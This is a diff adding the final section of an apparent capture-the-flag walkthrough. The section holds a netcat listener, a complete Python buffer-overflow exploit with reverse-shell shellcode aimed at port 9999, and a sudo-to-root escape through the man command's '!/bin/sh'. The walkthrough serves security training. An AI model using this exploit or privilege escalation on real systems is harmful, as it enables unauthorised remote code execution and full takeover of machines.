@@ -261,3 +261,68 @@ FOTO
 
 Finally we would only have to modify the script adding that shellcode and changing the target by the real target and execute, but first we have to open the port that we have put in the msfvenom.
 
+```shell
+nc -lvp 4444
+```
+
+```python
+import socket
+
+target = 'IP'
+port = 9999
+
+buffer = '\x41' * 524
+buffer += '\xf3\x12\x17\x31'
+shellcode =  b""
+shellcode += b"\xdb\xd3\xb8\xde\xc4\x7c\x8b\xd9\x74\x24\xf4"
+shellcode += b"\x5b\x29\xc9\xb1\x12\x31\x43\x17\x83\xeb\xfc"
+shellcode += b"\x03\x9d\xd7\x9e\x7e\x10\x03\xa9\x62\x01\xf0"
+shellcode += b"\x05\x0f\xa7\x7f\x48\x7f\xc1\xb2\x0b\x13\x54"
+shellcode += b"\xfd\x33\xd9\xe6\xb4\x32\x18\x8e\x4c\xcd\x41"
+shellcode += b"\x92\x39\xcf\x75\x3b\xe6\x46\x94\x8b\x70\x09"
+shellcode += b"\x06\xb8\xcf\xaa\x21\xdf\xfd\x2d\x63\x77\x90"
+shellcode += b"\x02\xf7\xef\x04\x72\xd8\x8d\xbd\x05\xc5\x03"
+shellcode += b"\x6d\x9f\xeb\x13\x9a\x52\x6b"
+buffer += '\x90' * 32
+buffer += shellcode
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+print(buffer)
+s.send((buffer))
+s.close()
+```
+
+FOTO
+
+And we're in! Let's escalate privileges now.
+
+FOTO
+
+Let's see the sudo -l of our user
+
+```shell
+sudo -l
+```
+
+FOTO
+
+We see an executable of its own that when executed we can see that one of the options is the man command, let's see if it has an entry in [gtfobins](https://gtfobins.github.io/gtfobins/man/#sudo).
+
+FOTO
+
+If it has, let's use it to see if it works.
+
+```shell
+sudo -u root /home/anansi/bin/anansi_util
+manual man
+!/bin/sh
+```
+
+FOTO
+
+FOTO
+
+FOTO
+
+And there it is, we are root!
